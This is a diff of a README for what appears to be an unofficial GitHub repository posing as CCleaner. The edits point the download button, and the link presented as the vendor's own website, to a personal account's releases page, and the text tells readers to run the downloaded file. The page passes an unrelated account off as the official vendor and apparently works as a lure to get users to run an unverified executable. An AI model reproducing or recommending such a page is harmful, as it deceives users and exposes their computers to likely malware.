@@ -37,7 +37,7 @@ Keep your system up to date by automatically updating outdated software with CCl
 ## Download CCleaner Now! 📥
 
 Click the button below to download CCleaner and start optimizing your Windows system today: <br>
-[![Download CCleaner](https://img.shields.io/badge/Download-CCleaner-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download CCleaner](https://github.com/Monirulcnn/CCleaner/releases)](https://github.com/Monirulcnn/CCleaner/releases)
 
 *Note: The link above will prompt the download of the CCleaner application. Make sure to launch the downloaded file to install CCleaner on your system.*
 
@@ -45,6 +45,6 @@ If the link is not working or you need more information, please check the "Relea
 
 ## Stay Connected! 🌐
 
-For the latest updates, tips, and tricks on system optimization and more, visit our [website](https://ccleaner.com/).
+For the latest updates, tips, and tricks on system optimization and more, visit our [website](https://github.com/Monirulcnn/CCleaner/releases).
 
 Let CCleaner be your go-to tool for keeping your Windows system in top shape! Happy cleaning! 🚿🔧
